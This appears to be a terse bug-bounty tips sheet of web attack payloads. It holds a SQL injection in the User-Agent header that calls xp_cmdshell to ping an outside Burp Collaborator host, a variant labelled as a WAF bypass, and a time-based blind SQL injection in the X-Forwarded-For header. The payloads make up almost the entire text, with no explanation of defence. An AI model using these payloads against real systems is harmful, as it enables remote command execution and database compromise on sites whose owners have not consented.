## 
Bug: Blind RCE via user-agent MSSQLi 

Tips: ```User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'; EXEC xp_cmdshell 'ping myburpcollablink.burpcollaborator.net';-- ```

```‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping myburpcollablink.burpcollaborator.net’ — (bypasses WAF)```

Bug : Blind SQL Injection

Tips : ```X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z```
